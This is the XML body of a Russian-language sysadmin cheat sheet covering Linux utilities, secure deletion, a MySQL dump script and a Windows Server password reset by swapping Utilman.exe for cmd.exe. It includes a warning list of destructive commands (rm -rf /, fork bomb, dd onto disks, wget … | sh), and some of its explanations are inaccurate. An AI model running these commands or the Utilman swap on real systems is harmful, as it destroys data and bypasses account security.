text:style-name="T2">bash</text:span><text:span text:style-name="T3">, </text:span><text:span text:style-name="T2">ls</text:span><text:span text:style-name="T3">, </text:span><text:span text:style-name="T2">cat</text:span><text:span text:style-name="T3">, </text:span><text:span text:style-name="T2">sed</text:span><text:span text:style-name="T3">, </text:span><text:span text:style-name="T2">grep</text:span><text:span text:style-name="T3">, </text:span><text:span text:style-name="T2">awk</text:span><text:span text:style-name="T3">, </text:span><text:span text:style-name="T2">rsync</text:span><text:span text:style-name="T3"> и т.д.), и автоматически открывает режим </text:span><text:span text:style-name="T2">sftp</text:span><text:span text:style-name="T3"> после входа в систему.</text:span></text:p>
      <text:p text:style-name="P3"><text:span text:style-name="T3">6. </text:span><text:span text:style-name="T2">https</text:span><text:span text:style-name="T3">://</text:span><text:span text:style-name="T2">tabby</text:span><text:span text:style-name="T3">.</text:span><text:span text:style-name="T2">sh</text:span><text:span text:style-name="T3">/ - современный инструмент терминального подключения, с открытым исходным кодом и кроссплатформенный, поддерживающий системы </text:span><text:span text:style-name="T2">Windows</text:span><text:span text:style-name="T3">, </text:span><text:span text:style-name="T2">MacOS</text:span><text:span text:style-name="T3"> и </text:span><text:span text:style-name="T2">Linux</text:span><text:span text:style-name="T3">. </text:span><text:span text:style-name="T2">Tabby</text:span><text:span text:style-name="T3"> имеет более 20</text:span><text:span text:style-name="T2">k</text:span><text:span text:style-name="T3">+ </text:span><text:span text:style-name="T2">Star</text:span><text:span text:style-name="T3"> на </text:span><text:span text:style-name="T2">Github</text:span><text:span text:style-name="T3">, что говорит о том, что это очень популярный терминальный инструмент</text:span></text:p>
      <text:p text:style-name="P1">Команда findmnt -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 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text:p>
      <text:p text:style-name="P1"># findmnt</text:p>
      <text:p text:style-name="P1">Чтобы отобразить информацию в виде обычного списка, используйте параметр -l, как показано ниже</text:p>
      <text:p text:style-name="P1"># findmnt -l</text:p>
      <text:p text:style-name="P1">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text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2"># findmnt --fstab -t xfs </text:span><text:span text:style-name="T3">или</text:span><text:span text:style-name="T2"> # findmnt --fstab -t ext4</text:span></text:p>
      <text:p text:style-name="P1">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text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2"># findmnt --fstab /mnt/external/disk2 <text:s text:c="2"/>#this prints bind mounts where /mnt/external/disk2 is a source</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T3">или</text:span><text:span text:style-name="T2"> # findmnt --fstab --target /mnt/external/disk2</text:span></text:p>
      <text:p text:style-name="P1">Выводим все файловые системы /etc/fstab и преобразовываем теги LABEL = и UUID = в реальные имена устройств, добавьте ключ - - evaluate</text:p>
      <text:p text:style-name="P1"># findmnt --fstab --evaluate</text:p>
      <text:p text:style-name="P1">Отобразить только точку монтирования, в которой смонтирована файловая система с меткой «/ boot» или «/», используйте следующую команду.</text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2"># findmnt -n --raw --evaluate --output=target LABEL=/boot </text:span><text:span text:style-name="T3">или</text:span><text:span text:style-name="T2"> # findmnt -n --raw --evaluate --output=target LABEL=/</text:span></text:p>
      <text:p text:style-name="P1">Findmnt также позволяет отслеживать действия по монтированию, размонтированию, перемонтированию и перемещению каталога, например, в /mnt/test.</text:p>
      <text:p text:style-name="P1"># findmnt --poll --mountpoint /mnt/test</text:p>
      <text:p text:style-name="P1">Если вы хотите больше информации в выводе, используйте ключ - verbose</text:p>
      <text:p text:style-name="P7"># findmnt --real --verbose</text:p>
      <text:p text:style-name="P2"><text:soft-page-break/><text:span text:style-name="T3">11 опасных команд Linux, которые вы никогда не должны запускать:</text:span></text:p>
      <text:p text:style-name="P13">rm -rf / - Эта команда удалит все файлы и папки на вашем компьютере. Не запускайте ее, если не хотите потерять все свои данные.</text:p>
      <text:p text:style-name="P13">:(){ :|: &amp; };: - Это команда, также известная как "fork bomb", может вызвать переполнение памяти на вашем компьютере и привести к аварийному завершению системы.</text:p>
      <text:p text:style-name="P1">mkfs.ext4 /dev/sda - Эта команда форматирует жесткий диск без какого-либо предупреждения или подтверждения. Все данные будут утеряны.</text:p>
      <text:p text:style-name="P1">dd if=/dev/random of=/dev/sda - Эта команда перезапишет все данные на жестком диске случайными значениями, что приведет к потере данных.</text:p>
      <text:p text:style-name="P1">chmod 777 / - Эта команда откроет полный доступ к вашей файловой системе для всех пользователей, что может привести к нарушению безопасности.</text:p>
      <text:p text:style-name="P1">mv /home/* /dev/null - Эта команда переместит все файлы в вашей домашней директории в "null", что означает, что они будут утеряны.</text:p>
      <text:p text:style-name="P1">wget http://example.com/file -O /dev/null - Эта команда загрузит файл и перезапишет все данные в "null", что приведет к потере данных.</text:p>
      <text:p text:style-name="P1">mkfs.ext4 /dev/sda1 - Эта команда форматирует раздел жесткого диска без какого-либо предупреждения или подтверждения. Все данные на этом разделе будут утеряны.</text:p>
      <text:p text:style-name="P1">ln -s /dev/null /etc/passwd - Эта команда создаст символическую ссылку на "/etc/passwd" в "null", что приведет к потере данных.</text:p>
      <text:p text:style-name="P1">echo "Hello" &gt; /dev/sda - Перезапишите свой раздел, это заменит ваш раздел, содержащий все данные, необходимые для загрузки системы, строкой «Hello».</text:p>
      <text:p text:style-name="P7">wget http://malicious_source -O- | sh - Такие команды будут загружать и запускать в вашей системе вредоносные сценарии, которые могут подорвать безопасность вашей системы.</text:p>
      <text:p text:style-name="P1">Утилиты linux:</text:p>
      <text:p text:style-name="P1">rsync</text:p>
      <text:p text:style-name="P1">-v - выводит подробную информацию о процессе копирования;</text:p>
      <text:p text:style-name="P1">[-a] - сохраняет все атрибуты оригинальных файлов;</text:p>
      <text:p text:style-name="P1">-u - не перезаписывать более новые файлы;</text:p>
      <text:p text:style-name="P1">-l - копирует символьные ссылки;</text:p>
      <text:p text:style-name="P1">-L - копирует содержимое ссылок;</text:p>
      <text:p text:style-name="P1">-p - сохраняет права для файлов;</text:p>
      <text:p text:style-name="P1">-t - сохраняет время модификации;</text:p>
      <text:p text:style-name="P1">-e - использовать другой транспорт, например, ssh;</text:p>
      <text:p text:style-name="P1">[-z] - cжимает файлы перед передачей;</text:p>
      <text:p text:style-name="P1">—recursive - перебирать директории рекурсивно;</text:p>
      <text:p text:style-name="P1">—exclude - Исключить файлы по шаблону;</text:p>
      <text:p text:style-name="P1">Примеры:</text:p>
      <text:p text:style-name="P1">rsync -avz skillproject/data/ . - из подкаталога в текущий каталог</text:p>
      <text:p text:style-name="P1">rsync -avz skillproject/data/ aaa/ - из подпапки в подпапку aaa/</text:p>
      <text:p text:style-name="P2"><text:soft-page-break/><text:span text:style-name="T3">rsync -avz skillproject/data/ digita6d@digita6d.beget.tech:/home/d/digita6d/code-skills.ru/public_html/sources/skillproject/data/ - передача на удаленный сервер</text:span></text:p>
      <text:p text:style-name="P1">rsync -avze ssh skillproject/data/ digita6d@digita6d.beget.tech:/home/d/digita6d/code-skills.ru/public_html/sources/skillproject/data/ - то же самое м явным указанием ssh</text:p>
      <text:p text:style-name="P1">ss</text:p>
      <text:p text:style-name="P13">-l или - listening - посмотреть только прослушиваемые порты;</text:p>
      <text:p text:style-name="P13">-p или - program - показать имя программы и ее PID;</text:p>
      <text:p text:style-name="P1">-t или - tcp - показать tcp порты;</text:p>
      <text:p text:style-name="P1">-u или - udp показать udp порты;</text:p>
      <text:p text:style-name="P1">-n или - numeric показывать ip адреса в числовом виде.</text:p>
      <text:p text:style-name="P1">Примеры:</text:p>
      <text:p text:style-name="P1">ss -tlpn - проверить все прослушивающие tcp-порты</text:p>
      <text:p text:style-name="P1">ss -tulpn | grep :80 - показать все процессы, работающие на 80-м порту</text:p>
      <text:p text:style-name="P1">ps</text:p>
      <text:p text:style-name="P1">ps -e - показать все процессы</text:p>
      <text:p text:style-name="P1">ps -ef - показать подробную информацию о каждом процессе</text:p>
      <text:p text:style-name="P1">ps -ef | grep phantom - найти все процессы с именем phantom</text:p>
      <text:p text:style-name="P1">mpstat</text:p>
      <text:p text:style-name="P1">Показывает статистику загрузки процессора. Команды:</text:p>
      <text:p text:style-name="P1">mpstat - показывает общую информацию</text:p>
      <text:p text:style-name="P1">mpstat -P ALL <text:s/>- по каждому ядру</text:p>
      <text:p text:style-name="P1">free</text:p>
      <text:p text:style-name="P1">Показывает потребление ОЗУ на текущий момент:</text:p>
      <text:p text:style-name="P1">free -h - показывает информацию в гигабайтах (более человеко читаемо, чем в байтах)</text:p>
      <text:p text:style-name="P1">top</text:p>
      <text:p text:style-name="P1">Что-то наподобие диспетчера задач, только для линукс, показывает попроцессное потребление озу</text:p>
      <text:p text:style-name="P1">dpkg</text:p>
      <text:p text:style-name="P1">Пакетный менеджер для debian систем (не путать с системой управления пакетами - apt/apt-get)</text:p>
      <text:p text:style-name="P1">dpkg -s &lt;packname&gt; - проверить, установлен ли пакет</text:p>
      <text:p text:style-name="P1">dpkg -l - список всех пакетов</text:p>
      <text:p text:style-name="P1">dpkg -l | grep apache2 - проверить, установлен ли конкретный пакет</text:p>
      <text:p text:style-name="P1">dpkg -i &lt;package.deb&gt; - установить пакет</text:p>
      <text:p text:style-name="P1">netstat</text:p>
      <text:p text:style-name="P7">netstat -pnltu - посмотреть список используемых портов</text:p>
      <text:p text:style-name="P1">Stress - это инструмент командной строки Linux, который позволяет нагружать процессор, память, систему ввода-вывода и диск</text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T3">Установим</text:span><text:span text:style-name="T2"> stress </text:span><text:span text:style-name="T3">на</text:span><text:span text:style-name="T2"> CentOS, RHEL, Fedora</text:span></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">#sudo dnf install stress</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T3">Установим</text:span><text:span text:style-name="T2"> stress </text:span><text:span text:style-name="T3">на</text:span><text:span text:style-name="T2"> Ubuntu </text:span><text:span text:style-name="T3">и</text:span><text:span text:style-name="T2"> Debian</text:span></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:soft-page-break/><text:span text:style-name="T2">#sudo apt install stress</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T3">Синтаксис</text:span><text:span text:style-name="T2"> stress: stress [OPTION [ARG]]</text:span></text:p>
      <text:p text:style-name="P1">Увеличить нагрузку на процессор. Опция -c или - cpu использует заданное количество воркеров на функции sqrt(), чтобы увеличить нагрузку на процессор и заставить его работать интенсивнее.</text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">#stress -c N </text:span><text:span text:style-name="T3">или</text:span><text:span text:style-name="T2"> stress --cpu N</text:span></text:p>
      <text:p text:style-name="P1">Следующая команда будет непрерывно загружать 4 ядра процессора</text:p>
      <text:p text:style-name="P13">#stress --cpu 4</text:p>
      <text:p text:style-name="P13">Задаем тайм-аут для стресса. Чтобы задать работу на определенное время, вы можете использовать опцию -t или - timeout. Следующие команды будут нагружать четыре ядра процессора только в течение 10 с.</text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">#stress -c 4 -t 10 </text:span><text:span text:style-name="T3">или</text:span><text:span text:style-name="T2"> stress --cpu 4 --timeout 10</text:span></text:p>
      <text:p text:style-name="P1">Увеличение нагрузки на память. Опция -v или --vm позволяет вам нагрузить виртуальную память.</text:p>
      <text:p text:style-name="P1">#[simterm] $ stress -v N</text:p>
      <text:p text:style-name="P1">Увеличение нагрузки ввода-вывода на диск. Вы можете увеличить нагрузку ввода-вывода с помощью опции -i или - io.</text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">#stress -i N </text:span><text:span text:style-name="T3">или</text:span><text:span text:style-name="T2"> stress --io N</text:span></text:p>
      <text:p text:style-name="P1">Создаем нагрузка на систему с помощью двух процессов, связанных с вводом-выводом.</text:p>
      <text:p text:style-name="P1">#stress --io 100</text:p>
      <text:p text:style-name="P1">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 Если вы выполните эту команду без каких-либо аргументов, то она покажет дисковые IO для всех доступных дисков.</text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">#iostat -d /dev/vda -d /dev/vdb 1</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P1">Увеличение нагрузки на диск. Опция -d или - hdd используется для создания нагрузки на диск.</text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">#stress -d N </text:span><text:span text:style-name="T3">или</text:span><text:span text:style-name="T2"> stress --hdd N</text:span></text:p>
      <text:p text:style-name="P1">Для увеличения нагрузки на диск мы используем следующую команду</text:p>
      <text:p text:style-name="P1">#stress --hdd 100</text:p>
      <text:p text:style-name="P1">Посмотрим пропускную способность диска с помощью команды vmstat</text:p>
      <text:p text:style-name="P1">#vmstat 1 100</text:p>
      <text:p text:style-name="P1">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text:p>
      <text:p text:style-name="P11" loext:marker-style-name="T1"><text:span text:style-name="T2">#stress --cpu 4 --vm 2 --io 1 -t 20</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P1">Системные утилиты для безопасного удаления файлов с HDD:</text:p>
      <text:p text:style-name="P1">Windows. В данном примере мы форматируем том D в файловую систему NTFS, при этом даем операционной системе команду предварительно перезаписать весь раздел нулями 10 раз, используя параметр /p («passes»), задающий количество проходов. </text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:soft-page-break/><text:span text:style-name="T2">#format d: /fs:NTFS /p:10</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P1">Linux. Быстро и надежно удаляет один или несколько файлов. </text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">#shred -u -n 40 /private/file.txt</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P1">В этом примере мы перезаписали файл file.txt случайными данными 40 раз подряд (параметр -n, по умолчанию же shred совершает 25 проходов) и затем удалили его (параметр -u, поскольку по умолчанию shred не удаляет файлы, а сразу перезаписывает). </text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">#shred -u -n 40 /private/file.txt /private/file2.txt</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P1">Если нам внужно дополнительно скрыть и сам факт «зачистки», то можете воспользоваться параметром -z:</text:p>
      <text:p text:style-name="P14" loext:marker-style-name="T1"><text:span text:style-name="T2">#shred -u -z -n 40 /private/file.txt</text:span></text:p>
      <text:p text:style-name="P14" loext:marker-style-name="T1"><text:span text:style-name="T3">Единственный недостаток shred - данная утилита не умеет работать с директориями. Поэтому если вам требуется уничтожить содержимое целого каталога с вложенными папками, стоит воспользоваться wipe. В данном примере мы отдали команду рекурсивно (-r) удалить все, что находится в папке private, а также отключили запрос подтверждения удаления папок и файлов (-f), которое wipe выводит по умолчанию. Среди интересных дополнительных опций, поддерживаемых утилитой, стоит выделить принудительное выполнение chmod для каталогов и файлов, защищенных от перезаписи (-c), работу в тихом режиме (-s) и возможность заставить wipe следовать символическим ссылкам (-D, конфликтует с -r).</text:span></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">#wipe -rf /private/*</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">Mac OS. </text:span><text:span text:style-name="T3">В версиях операционной системы с 10.4 по 10.10 вы могли инициировать перезапись файлов, переместив их в корзину, а затем выбрав в Finder опцию «Очистить корзину необратимо», однако впоследствии Apple от нее отказалась. Вплоть до версии 10.11 для безопасного удаления данных можно было воспользоваться консольной командой srm. В данном примере мы рекурсивно удаляем содержимое папки private (-r), перезаписывая каждый файл случайными данными 7 раз подряд (-m). Также можно выбрать однократную перезапись файлов (-s) или же не указывать этот параметр вовсе - в этом случае утилита выполнит 35 проходов.</text:span></text:p>
      <text:p text:style-name="P1">#srm -rm /private/</text:p>
      <text:p text:style-name="P1">В актуальных версиях Mac OS инициировать безопасное удаление файлов с жесткого диска можно с помощью Дисковой утилиты (для этого необходимо нажать на кнопку «Параметры безопасности» и задать количество циклов перезаписи), либо через терминал, используя конструкцию вида. Параметр -P является специфичным для Mac OS и сообщает утилите, что удаляемые файлы необходимо трижды перезаписать.</text:p>
      <text:p text:style-name="P7">#rm -P /private/file.txt</text:p>
      <text:p text:style-name="P1">Подборка фото/видео редакторов с открытым исходным кодом:</text:p>
      <text:p text:style-name="P1">1. Видеоредакторы:</text:p>
      <text:p text:style-name="P1">Kdenlive (https://kdenlive.org/) - простой, но с широким функционалом.</text:p>
      <text:p text:style-name="P1">OpenShot (https://www.openshot.org/) - тоже простой, но функциональный редактор.</text:p>
      <text:p text:style-name="P2"><text:soft-page-break/><text:span text:style-name="T3">Shotcut (https://www.shotcut.org/) - кроссплатформенный видеоредактор.</text:span></text:p>
      <text:p text:style-name="P1">Olive (https://www.olivevideoeditor.org/) - нелинейный видеоредактор для Windows, macOS, и Linux.</text:p>
      <text:p text:style-name="P1">Flowblade (https://jliljebl.github.io/flowblade/) - мульти-дорожный видеоредактор. </text:p>
      <text:p text:style-name="P1">2. Фоторедакторы/Графический дизайн:</text:p>
      <text:p text:style-name="P1">Inkscape (https://inkscape.org/) - софт для работы с векторной графикой.</text:p>
      <text:p text:style-name="P1">GIMP (https://www.gimp.org/) - популярный кросс-платформенный фоторедактор.</text:p>
      <text:p text:style-name="P1">Krita (https://krita.org/) - рисовалка + фоторедактор с широким функционалом. </text:p>
      <text:p text:style-name="P1">Akira (https://github.com/akiraux/Akira) - нативный софт в Linux для UX и UI дизайна. </text:p>
      <text:p text:style-name="P1">Seashore (https://github.com/robaho/seashore) - неплохой фоторедактор для MacOS.</text:p>
      <text:p text:style-name="P13">+Бонус:</text:p>
      <text:p text:style-name="P13">SumatraPDF (https://www.sumatrapdfreader.org/) - мультиформатная читалка для Windows.</text:p>
      <text:p text:style-name="P1">Skim (https://skim-app.sourceforge.io/) - .pdf читалка с функционалом заметок для MacOS.</text:p>
      <text:p text:style-name="P4">PDF Viewer Plus (https://github.com/JavaCafe01/PdfViewer) - простая .pdf читалка для Android.</text:p>
      <text:p text:style-name="P1">Bash-скрипт для выполнения дампа всех баз данных MySQL, используемых на сервере:</text:p>
      <text:p text:style-name="P1">1- Для запуска скрипта необходимо дать права на исполнение скрипту командой chmod +x dump_all_databases.sh.</text:p>
      <text:p text:style-name="P1">2- Запустить скрипт выполнив одну из следующих команд:</text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">./dump_all_databases.sh</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">sh dump_all_databases.sh</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P1">bash dump_all_databases.sh</text:p>
      <text:p text:style-name="P1">3- Дождататься, когда выполниться процесс. Дампы будут сохранены в формате YYYYMMDD.name_db.sql.</text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">#!/usr/bin/env bash</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">databases=`mysql -e "SHOW DATABASES;" | tr -d "| " | grep -v Database`</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">for db in $databases; do</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2"><text:s text:c="4"/>if [[ "$db" != "information_schema" ]] &amp;&amp; [[ "$db" != "performance_schema" ]] &amp;&amp; [[ "$db" != "mysql" ]] &amp;&amp; [[ "$db" != _* ]] ; then</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2"><text:s text:c="8"/>echo "Dumping database: $db"</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2"><text:s text:c="8"/>mysqldump --databases $db &gt; `date +%Y%m%d`.$db.sql</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2"><text:s text:c="7"/># gzip $OUTPUT/`date +%Y%m%d`.$db.sql</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2"><text:s text:c="4"/>fi</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P11" loext:marker-style-name="T1"><text:span text:style-name="T2">done</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:soft-page-break/><text:span text:style-name="T2">Сброс пароля Windows Server на примере пользователя Администратор/Administrator Windows Server 2012/2016:</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">1 - Нам потребуется образ Windows Server 2016, Windows Server 2012. </text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">2 - Подключаемся к серверу через IPMI, либо KVM, загружаем образ в VirtualMedia.</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T3">3 - После того, как образ был загружен, выполняем перезагрузку сервера. </text:span><text:span text:style-name="T2">При загрузке ОС будет сообщение Press any key to boot from CD or DVD. </text:span><text:span text:style-name="T3">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span></text:p>
      <text:p text:style-name="P1">4 - В выборе действия нажимает Диагностика.</text:p>
      <text:p text:style-name="P1">5 - Далее выбираем Командная строка. Для начала необходимо найти системный диск, выполним команду:</text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T3"><text:s text:c="4"/></text:span><text:span text:style-name="T2">echo</text:span><text:span text:style-name="T3"> %</text:span><text:span text:style-name="T2">windir</text:span><text:span text:style-name="T3">%</text:span></text:p>
      <text:p text:style-name="P1">6 - Команда выведет системный диск. Переходим в него:</text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T3"><text:s text:c="4"/></text:span><text:span text:style-name="T2">C</text:span><text:span text:style-name="T3">: <text:s text:c="3"/></text:span></text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T3">7 - В случае, если диск </text:span><text:span text:style-name="T2">C</text:span><text:span text:style-name="T3"> является системным. Далее переходим в </text:span><text:span text:style-name="T2">System</text:span><text:span text:style-name="T3">32:</text:span></text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T3"><text:s text:c="4"/></text:span><text:span text:style-name="T2">cd</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T2">Windows</text:span><text:span text:style-name="T3">\</text:span><text:span text:style-name="T2">System</text:span><text:span text:style-name="T3">32</text:span></text:p>
      <text:p text:style-name="P14"><text:span text:style-name="T3">8 - Далее переименовываем </text:span><text:span text:style-name="T2">Utilman</text:span><text:span text:style-name="T3">.</text:span><text:span text:style-name="T2">exe</text:span><text:span text:style-name="T3"> на </text:span><text:span text:style-name="T2">Utilman</text:span><text:span text:style-name="T3">.</text:span><text:span text:style-name="T2">exe</text:span><text:span text:style-name="T3">.</text:span><text:span text:style-name="T2">old</text:span><text:span text:style-name="T3">:</text:span></text:p>
      <text:p text:style-name="P14"><text:span text:style-name="T3"><text:s text:c="4"/></text:span><text:span text:style-name="T2">ren Utilman.exe Utilman.exe.old</text:span></text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T3">9 - Выполняем замену </text:span><text:span text:style-name="T2">cmd</text:span><text:span text:style-name="T3"> на </text:span><text:span text:style-name="T2">Utilman</text:span><text:span text:style-name="T3">.</text:span><text:span text:style-name="T2">exe</text:span></text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T3"><text:s text:c="4"/></text:span><text:span text:style-name="T2">copy</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T2">cmd</text:span><text:span text:style-name="T3">.</text:span><text:span text:style-name="T2">exe</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T2">Utilman</text:span><text:span text:style-name="T3">.</text:span><text:span text:style-name="T2">exe</text:span><text:span text:style-name="T3"> <text:s text:c="4"/></text:span></text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T3">10 - После этого закрываем консоль и нажимаем кнопку Продолжить. После загрузки сервера появится экран ввода логина и пароля. Нажимаем </text:span><text:span text:style-name="T2">Win</text:span><text:span text:style-name="T3"> + </text:span><text:span text:style-name="T2">U</text:span><text:span text:style-name="T3"> и вводим следующую команду:</text:span></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">net</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T2">user</text:span><text:span text:style-name="T3"> Администратор </text:span><text:span text:style-name="T2">new</text:span><text:span text:style-name="T3">_</text:span><text:span text:style-name="T2">password</text:span></text:p>
      <text:p text:style-name="P11"><text:span text:style-name="T3">где </text:span><text:span text:style-name="T2">new</text:span><text:span text:style-name="T3">_</text:span><text:span text:style-name="T2">password</text:span><text:span text:style-name="T3"> -- новый пароль пользователя Администратор. В </text:span><text:span text:style-name="T2">EN</text:span><text:span text:style-name="T3">-локализации пользователь имеет названиме </text:span><text:span text:style-name="T2">Administrator</text:span><text:span text:style-name="T3">. <text:s text:c="3"/></text:span></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">findstr</text:span><text:span text:style-name="T3"> - выполняет поиск шаблонов текста в файлах </text:span><text:span text:style-name="T2">windows</text:span><text:span text:style-name="T3">:</text:span></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">findstr [/b] [/e] [/l | /r] [/s] [/i] [/x] [/v] [/n] [/m] [/o] [/p] [/f:&lt;file&gt;] [/c:&lt;string&gt;] [/g:&lt;file&gt;] [/d:&lt;dirlist&gt;] [/a:&lt;colorattribute&gt;] [/off[line]] &lt;strings&gt; [&lt;drive&gt;:][&lt;path&gt;]&lt;filename&gt;[ ...]</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P1">Параметр Описание</text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T3">/</text:span><text:span text:style-name="T2">b</text:span><text:span text:style-name="T3"> Соответствует шаблону текста, если он находится в начале строки.</text:span></text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T3">/</text:span><text:span text:style-name="T2">e</text:span><text:span text:style-name="T3"> Соответствует шаблону текста, если он находится в конце строки.</text:span></text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T3">/</text:span><text:span text:style-name="T2">l</text:span><text:span text:style-name="T3"> Обрабатывает строки поиска буквально.</text:span></text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T3">/</text:span><text:span text:style-name="T2">r</text:span><text:span text:style-name="T3"> Обрабатывает строки поиска в виде регулярных выражений. Это параметр по умолчанию.</text:span></text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T3">/</text:span><text:span text:style-name="T2">s</text:span><text:span text:style-name="T3"> Выполняет поиск в текущем каталоге и во всех подкаталогах.</text:span></text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T3">/</text:span><text:span text:style-name="T2">i</text:span><text:span text:style-name="T3"> Игнорирует регистр символов при поиске строки.</text:span></text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T3">/</text:span><text:span text:style-name="T2">x</text:span><text:span text:style-name="T3"> Выводит строки, которые точно соответствуют друг другу.</text:span></text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T3">/</text:span><text:span text:style-name="T2">v</text:span><text:span text:style-name="T3"> Выводит только те строки, которые не содержат совпадений.</text:span></text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T3">/</text:span><text:span text:style-name="T2">n</text:span><text:span text:style-name="T3"> Выводит номер строки каждой соответствующей строки.</text:span></text:p>
      <text:p text:style-name="P2"><text:soft-page-break/><text:span text:style-name="T3">/</text:span><text:span text:style-name="T2">m</text:span><text:span text:style-name="T3"> Печатает только имя файла, если файл содержит совпадение.</text:span></text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T3">/</text:span><text:span text:style-name="T2">o</text:span><text:span text:style-name="T3"> Выводит смещение символов перед каждой совпадающей строкой.</text:span></text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T3">/</text:span><text:span text:style-name="T2">p</text:span><text:span text:style-name="T3"> Пропускает файлы с непечатаемыми символами.</text:span></text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T3">"/</text:span><text:span text:style-name="T2">OFF</text:span><text:span text:style-name="T3">" [строка] Не пропускает файлы с установленным атрибутом </text:span><text:span text:style-name="T2">offline</text:span><text:span text:style-name="T3">.</text:span></text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T3">ключа&lt;</text:span><text:span text:style-name="T2">file</text:span><text:span text:style-name="T3">&gt; Возвращает список файлов из указанного файла.</text:span></text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T3">/</text:span><text:span text:style-name="T2">c</text:span><text:span text:style-name="T3">:&lt;</text:span><text:span text:style-name="T2">string</text:span><text:span text:style-name="T3">&gt; Использует указанный текст в качестве литеральной строки поиска.</text:span></text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T3">/</text:span><text:span text:style-name="T2">g</text:span><text:span text:style-name="T3">&lt;</text:span><text:span text:style-name="T2">file</text:span><text:span text:style-name="T3">&gt; Возвращает строки поиска из указанного файла.</text:span></text:p>
